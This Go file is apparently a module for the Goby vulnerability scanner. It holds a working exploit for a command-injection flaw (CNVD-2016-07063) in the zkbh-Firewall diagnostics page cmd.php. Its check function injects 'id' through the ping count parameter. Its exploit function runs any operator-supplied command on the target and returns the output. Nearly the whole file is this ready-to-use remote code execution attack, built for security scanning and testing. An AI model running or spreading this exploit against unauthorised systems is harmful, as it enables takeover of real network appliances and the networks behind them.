package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "zkbh_Firewall cmd.php RCE (CNVD-2016-07063)",
    "Description": "zkbh-Firewall cmd.php has insufficient filtering and has command execution vulnerabilities.",
    "Product": "zkbh-Firewall",
    "Homepage": "http://www.zkbh.com.cn/front/index",
    "DisclosureDate": "2016-09-01",
    "Author": "1291904552@qq.com",
    "GobyQuery": "app=\"zkbh-Firewall\"||body=\"博华网龙信息安全一体机\"",
    "Level": "3",
    "Impact": "<p></p>",
    "Recommandation": "",
    "GifAddress": "https://raw.githubusercontent.com/gobysec/GobyVuls/master/zhongkebohua/CNVD-2016-07063/zkbh_Firewall_cmd_php_RCE_CNVD_2016_07063.gif",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2016-07063"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id"
        }
    ],
    "ExpTips": null,
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": [
            "zkbh-Firewall"
        ]
    },
    "PocId": "10198",
    "Recommendation": ""
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/diagnostics/cmd.php?action=ping&count=||id||"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.FollowRedirect =false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody,"uid")
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/diagnostics/cmd.php?action=ping&count=||"+url.QueryEscape(cmd)+"||"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}

